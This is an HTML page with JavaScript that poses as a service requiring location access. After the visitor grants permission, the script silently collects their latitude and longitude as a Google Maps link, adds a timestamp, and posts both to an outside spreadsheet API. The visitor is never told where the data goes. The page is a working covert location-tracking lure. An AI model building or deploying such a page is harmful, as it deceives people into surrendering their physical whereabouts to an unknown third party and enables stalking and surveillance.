  <h1>Allow location to get the service</h1>
<p id=p_id></p>


<script>
  para=document.getElementById("p_id")
 getLocation();

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
    para.innerHTML="try the link on better browser like Chrome";
  } else { 
    console.log("Geolocation is not supported by this browser.");
     
  }
}

function showPosition(position) {
  

var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
var dateTime = date+' '+time;
document.getElementById("time_stamp").value=dateTime;



var latlon = position.coords.latitude + "," + position.coords.longitude;

  var img_url = "https://www.google.com/maps/search/?api=1&query="+latlon;
document.getElementById("lat").value=img_url;
//document.getElementById("lon").value=position.coords.longitude;


SubForm();

      function SubForm (){
      $.ajax({
        url:"https://api.apispreadsheets.com/data/14714/",
        type:"post",
        data:$("#myForm").serializeArray(),
        success: function(){
          console.log("Form Data Submitted :)")

        },
        error: function(){
          console.log("There was an error :(")
        }
      });
    }


}
</script>
